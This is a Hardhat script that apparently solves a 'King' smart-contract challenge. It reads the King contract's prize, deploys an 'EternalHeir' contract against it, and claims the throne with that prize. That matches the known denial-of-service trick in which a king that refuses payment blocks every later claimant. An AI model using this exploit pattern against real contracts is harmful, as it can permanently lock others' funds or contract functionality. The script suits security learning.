const { ethers } = require("hardhat")

async function main() {
  const [deployer] = await ethers.getSigners()

  console.log('Deploying contracts with the account:', deployer.address)

  console.log('Account balance:', (await deployer.getBalance()).toString())

  const KingFactory = await ethers.getContractFactory('King');
  const KingAdress = '0xbaf7657BAF28fa96f4E9eC0ecE6D5Ac46B9ADAb7';
  const King = KingFactory.attach(KingAdress);
  const prize = await King.prize();
  console.log(`Current prize to become king is ${prize}`);
  const EternalHeirFactory = await ethers.getContractFactory('EternalHeir');
  const EternalHeir = await EternalHeirFactory.deploy(KingAdress)
  await EternalHeir.deployed();

  await EternalHeir.claim({value: prize});
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
